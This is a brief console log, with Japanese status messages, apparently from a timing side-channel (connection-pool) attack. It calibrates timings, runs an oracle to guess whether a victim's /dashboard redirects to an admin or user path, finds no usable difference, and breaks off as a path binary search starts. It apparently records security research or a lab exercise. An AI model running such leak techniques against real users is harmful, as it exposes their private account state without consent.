...
プールを埋めた状態で計測...
  [pool] 5本のコネクションを確保
  /probe/aaaaa (pool満杯): 2.9ms
  /probe/zzzzz (pool満杯): 1.7ms
  /internal/admin/dashboard (pool満杯): 1.2ms
  /internal/user/dashboard (pool満杯): 1.3ms
キャリブレーション完了

=== オラクル実行 ===
VICTIM /dashboard にアクセスし、内部リダイレクト先を推測
...
平均: admin=3.7ms  user=3.7ms
差異が小さすぎる（< 20ms）。パスベースでは辞書順効果が出ない可能性あり。

=== バイナリサーチ（パス探索）===
ターゲット: /internal/{???}/dashboard の ??? を推測
